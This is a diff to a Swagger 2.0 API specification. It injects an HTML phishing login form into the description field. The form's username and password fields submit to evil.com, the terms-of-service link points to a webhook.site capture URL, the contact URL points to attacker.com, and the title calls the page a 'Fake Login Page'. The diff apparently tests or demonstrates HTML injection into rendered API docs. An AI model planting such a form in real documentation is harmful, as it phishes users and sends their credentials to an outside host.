@@ -1,13 +1,36 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Login Page
-  description: <a href="https://www.evil.com">Click Me</a>">
+  title: "Login Page - Fake Login Page"
+  description: |
+    <a href="https://www.evil.com">Click Me</a>
+    <div class="form-container">
+      <form action="https://evil.com" method="get" class="form-signin">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" name="username" size="20">
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" name="password" size="20">
+        </div>
+        <div class="form-group">
+          <button type="submit" class="btn btn-default">Login</button>
+        </div>
+      </form>
+    </div>
+  termsOfService: "https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428"
+  contact:
+    name: "API Support"
+    url: "https://attacker.com/"
+    email: "bilalabbasuk@gmail.com"
 paths:
-  /Login_Page:
+  /:
     post:
-      summary: Login here to continue
-      description: Please provide your credentials to log in.
+      summary: "Submit login form"
+      description: "Endpoint representing the login form POST."
+      consumes:
+        - application/x-www-form-urlencoded
       parameters:
         - name: username
           in: formData
@@ -19,20 +42,10 @@ paths:
           description: The password for login
           required: true
           type: string
-      tags:
-        - Click here to login
       responses:
         '200':
-          description: Successfully logged in and authenticated.
+          description: Login successful
         '400':
-          description: Invalid credentials or missing parameters.
+          description: Invalid credentials or missing parameters
         '500':
-
-          description: Internal server error.
-
-
-
-
-
-
-
+          description: Internal server error
